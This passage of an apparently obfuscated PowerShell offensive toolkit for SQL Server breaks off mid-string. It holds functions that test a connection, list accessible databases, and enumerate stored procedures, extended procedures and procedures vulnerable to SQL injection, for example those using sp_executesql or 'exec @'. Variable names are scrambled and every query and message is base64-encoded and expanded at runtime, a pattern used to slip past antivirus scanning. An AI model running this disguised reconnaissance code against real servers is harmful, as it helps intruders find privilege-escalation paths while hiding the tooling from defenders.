        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwByAGEAYgBiAGkAbgBnACAAcwB0AG8AcgBlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQBzACAAZgByAG8AbQAgAGQAYQB0AGEAYgBhAHMAZQBzACAAYgBlAGwAbwB3ADoA')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQA=')))
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAHUAcwBlACAAWwAkAHsALwA9AD0APQA9AFwALwA9AFwAXwAvAD0APQBcAF8AXwAvAH0AXQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8AQwBBAFQAQQBMAE8ARwAgAEEAUwAgAFsARABhAHQAYQBiAGEAcwBlAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIATwBVAFQASQBOAEUAXwBTAEMASABFAE0AQQAgAEEAUwAgAFsAUwBjAGgAZQBtAGEATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAE4AQQBNAEUAIABhAHMAIABbAFAAcgBvAGMAZQBkAHUAcgBlAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIATwBVAFQASQBOAEUAXwBUAFkAUABFACAAYQBzACAAWwBQAHIAbwBjAGUAZAB1AHIAZQBUAHkAcABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8ARABFAEYASQBOAEkAVABJAE8ATgAgAGEAcwAgAFsAUAByAG8AYwBlAGQAdQByAGUARABlAGYAaQBuAGkAdABpAG8AbgBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBRAEwAXwBEAEEAVABBAF8AQQBDAEMARQBTAFMALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8AQgBPAEQAWQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAUgBFAEEAVABFAEQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABMAEEAUwBUAF8AQQBMAFQARQBSAEUARAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIALgBpAHMAXwBtAHMAXwBzAGgAaQBwAHAAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgAuAGkAcwBfAGEAdQB0AG8AXwBlAHgAZQBjAHUAdABlAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgAFsASQBOAEYATwBSAE0AQQBUAEkATwBOAF8AUwBDAEgARQBNAEEAXQAuAFsAUgBPAFUAVABJAE4ARQBTAF0AIABhAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEoATwBJAE4AIABbAHMAeQBzAF0ALgBbAHAAcgBvAGMAZQBkAHUAcgBlAHMAXQAgACAAYgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAE4AIABhAC4AUgBPAFUAVABJAE4ARQBfAE4AQQBNAEUAIAA9ACAAYgAuAG4AYQBtAGUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwBIAEUAUgBFACAAMQA9ADEADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AF8ALwA9AFwAXwBfAF8AXwBfAC8AXAAvAD0AXABfAC8APQB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewAvAD0AXABfAF8AXwBfAC8APQBcAC8APQA9AD0APQBcAF8AfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsALwA9AD0AXAAvAD0APQA9AFwAXwBfAC8AXAAvAFwALwBcAH0A')))
            ${____/=\_____/==\/} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${_/\/\__/===\/\/\_} = ${_/\/\__/===\/\/\_} + ${____/=\_____/==\/}
        }
    }
    End
    {
        ${_/\/\__/===\/\/\_}
    }
}
Function  Get-SQLStoredProcedureXP
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${____/\_/=\/\/====} = New-Object -TypeName System.Data.DataTable
        if ($ProcedureName)
        {
            ${/=\____/=\/====\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAE4AQQBNAEUAIABsAGkAawBlACAAJwAkAFAAcgBvAGMAZQBkAHUAcgBlAE4AYQBtAGUAJwA=')))
        }
        else
        {
            ${/=\____/=\/====\_} = ''
        }
    }
    Process
    {
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwByAGEAYgBiAGkAbgBnACAAcwB0AG8AcgBlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQBzACAAZgByAG8AbQAgAGQAYQB0AGEAYgBhAHMAZQBzACAAYgBlAGwAbwB3ADoA')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQA=')))
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAHUAcwBlACAAWwAkAHsALwA9AD0APQA9AFwALwA9AFwAXwAvAD0APQBcAF8AXwAvAH0AXQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAJwAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACcAIABhAHMAIABbAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ACcAIABhAHMAIABbAEQAYQB0AGEAYgBhAHMAZQBOAGEAbQBlAF0ALAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwAuAG8AYgBqAGUAYwB0AF8AaQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABvAC4AcABhAHIAZQBuAHQAXwBvAGIAagBlAGMAdABfAGkAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwAuAHMAYwBoAGUAbQBhAF8AaQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGMALgBuAGEAbQBlACAAQQBTACAAcwBjAGgAZQBtAGEAXwBuAGEAbQBlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABvAC4AdAB5AHAAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwAuAHQAeQBwAGUAXwBkAGUAcwBjACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABvAC4AbgBhAG0AZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwAuAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAC4AdABlAHgAdAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBBAFMAVAAoAHMALgBjAHQAZQB4AHQAIABBAFMAIABOAFYAQQBSAEMASABBAFIAKABNAEEAWAApACkAIABBAFMAIABjAHQAZQB4AHQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBzAHQAYQB0AHUAcwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwAuAGMAcgBlAGEAdABlAF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwAuAG0AbwBkAGkAZgB5AF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwAuAGkAcwBfAG0AcwBfAHMAaABpAHAAcABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG8ALgBpAHMAXwBwAHUAYgBsAGkAcwBoAGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwAuAGkAcwBfAHMAYwBoAGUAbQBhAF8AcAB1AGIAbABpAHMAaABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBjAG8AbABpAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBjAG8AbQBwAHIAZQBzAHMAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAC4AZQBuAGMAcgB5AHAAdABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBpAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBsAGEAbgBnAHUAYQBnAGUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBuAHUAbQBiAGUAcgAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwAuAHQAZQB4AHQAdAB5AHAAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAcwB5AHMALgBvAGIAagBlAGMAdABzACAAbwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAE4ATgBFAFIAIABKAE8ASQBOACAAcwB5AHMALgBzAHkAcwBjAG8AbQBtAGUAbgB0AHMAIABzACAATwBOACAAbwAuAG8AYgBqAGUAYwB0AF8AaQBkACAAPQAgAHMALgBpAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBOAE4ARQBSACAASgBPAEkATgAgAHMAeQBzAC4AcwBjAGgAZQBtAGEAcwAgAHMAYwAgAE8ATgAgAG8ALgBzAGMAaABlAG0AYQBfAGkAZAAgAD0AIABzAGMALgBzAGMAaABlAG0AYQBfAGkAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAEgARQBSAEUAIABvAC4AdAB5AHAAZQAgAD0AIAAnAHgAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsALwA9AFwAXwBfAF8AXwAvAD0AXAAvAD0APQA9AD0AXABfAH0A')))
            ${/==\/=\__/=\___/=} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${____/\_/=\/\/====} = ${____/\_/=\/\/====} + ${/==\/=\__/=\___/=}
        }
    }
    End
    {
        ${__/\/=\/=\/\__/==} = ${____/\_/=\/\/====}.Count
        if(${__/\/=\/=\/\__/==} -eq 0){
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvACAAYwB1AHMAdABvAG0AIABlAHgAdABlAG4AZABlAGQAIABzAHQAbwByAGUAZAAgAHAAcgBvAGMAZQBkAHUAcgBlAHMAIABmAG8AdQBuAGQALgA=')))
            }
        }
        ${____/\_/=\/\/====}
    }
}
Function  Get-SQLStoredProcedureSQLi
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for signed procedures.')]
        [switch]$OnlySigned,
        [Parameter(Mandatory = $false,
        HelpMessage = "Only include procedures configured to execute when SQL Server service starts.")]
        [switch]$AutoExec,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\/\__/===\/\/\_} = New-Object -TypeName System.Data.DataTable
        if ($ProcedureName)
        {
            ${/=\____/=\/====\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAFIATwBVAFQASQBOAEUAXwBOAEEATQBFACAAbABpAGsAZQAgACcAJABQAHIAbwBjAGUAZAB1AHIAZQBOAGEAbQBlACcA')))
        }
        else
        {
            ${/=\____/=\/====\_} = ''
        }
        if ($Keyword)
        {
            ${/==\/===\__/\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAFIATwBVAFQASQBOAEUAXwBEAEUARgBJAE4ASQBUAEkATwBOACAAbABpAGsAZQAgACcAJQAkAEsAZQB5AHcAbwByAGQAJQAnAA==')))
        }
        else
        {
            ${/==\/===\__/\/\/\} = ''
        }
        if ($AutoExec)
        {
            ${_/=\_____/\/=\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAGkAcwBfAGEAdQB0AG8AXwBlAHgAZQBjAHUAdABlAGQAIAA9ACAAMQA=')))
        }
        else
        {
            ${_/=\_____/\/=\_/=} = ''
        }
    }
    Process
    {
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBoAGUAYwBrAGkAbgBnACAAZABhAHQAYQBiAGEAcwBlAHMAIABiAGUAbABvAHcAIABmAG8AcgAgAHYAdQBsAG4AZQByAGEAYgBsAGUAIABzAHQAbwByAGUAZAAgAHAAcgBvAGMAZQBkAHUAcgBlAHMAOgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEMAaABlAGMAawBpAG4AZwAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQAgAGQAYQB0AGEAYgBhAHMAZQAuAC4ALgA=')))
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAHUAcwBlACAAWwAkAHsALwA9AD0APQA9AFwALwA9AFwAXwAvAD0APQBcAF8AXwAvAH0AXQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8AQwBBAFQAQQBMAE8ARwAgAEEAUwAgAFsARABhAHQAYQBiAGEAcwBlAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIATwBVAFQASQBOAEUAXwBTAEMASABFAE0AQQAgAEEAUwAgAFsAUwBjAGgAZQBtAGEATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAE4AQQBNAEUAIABhAHMAIABbAFAAcgBvAGMAZQBkAHUAcgBlAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIATwBVAFQASQBOAEUAXwBUAFkAUABFACAAYQBzACAAWwBQAHIAbwBjAGUAZAB1AHIAZQBUAHkAcABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8ARABFAEYASQBOAEkAVABJAE8ATgAgAGEAcwAgAFsAUAByAG8AYwBlAGQAdQByAGUARABlAGYAaQBuAGkAdABpAG8AbgBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBRAEwAXwBEAEEAVABBAF8AQQBDAEMARQBTAFMALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8AQgBPAEQAWQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAUgBFAEEAVABFAEQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABMAEEAUwBUAF8AQQBMAFQARQBSAEUARAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIALgBpAHMAXwBtAHMAXwBzAGgAaQBwAHAAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgAuAGkAcwBfAGEAdQB0AG8AXwBlAHgAZQBjAHUAdABlAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgAFsASQBOAEYATwBSAE0AQQBUAEkATwBOAF8AUwBDAEgARQBNAEEAXQAuAFsAUgBPAFUAVABJAE4ARQBTAF0AIABhAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEoATwBJAE4AIABbAHMAeQBzAF0ALgBbAHAAcgBvAGMAZQBkAHUAcgBlAHMAXQAgACAAYgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAE4AIABhAC4AUgBPAFUAVABJAE4ARQBfAE4AQQBNAEUAIAA9ACAAYgAuAG4AYQBtAGUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwBIAEUAUgBFACAAMQA9ADEAIABBAE4ARAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAoAFIATwBVAFQASQBOAEUAXwBEAEUARgBJAE4ASQBUAEkATwBOACAAbABpAGsAZQAgACcAJQBzAHAAXwBlAHgAZQBjAHUAdABlAHMAcQBsACUAJwAgAE8AUgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8ARABFAEYASQBOAEkAVABJAE8ATgAgAGwAaQBrAGUAIAAnACUAcwBwAF8AcwBxAGwAZQB4AGUAYwAlACcAIABPAFIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAEQARQBGAEkATgBJAFQASQBPAE4AIABsAGkAawBlACAAJwAlAGUAeABlAGMAIABAACUAJwAgAE8AUgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAE8AVQBUAEkATgBFAF8ARABFAEYASQBOAEkAVABJAE8ATgAgAGwAaQBrAGUAIAAnACUAZQB4AGUAYwB1AHQAZQAgAEAAJQAnACAATwBSAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIATwBVAFQASQBOAEUAXwBEAEUARgBJAE4ASQBUAEkATwBOACAAbABpAGsAZQAgACcAJQBlAHgAZQBjACAAKAAlACcAIABPAFIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAEQARQBGAEkATgBJAFQASQBPAE4AIABsAGkAawBlACAAJwAlAGUAeABlAGMAKAAlACcAIABPAFIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBPAFUAVABJAE4ARQBfAEQARQBGAEkATgBJAFQASQBPAE4AIABsAGkAawBlACAAJwAlAGUAeABlAGMAdQB0AGUAIAAoACUAJwAgAE8AUgANAAoAIAAgACAAIAAgACAAI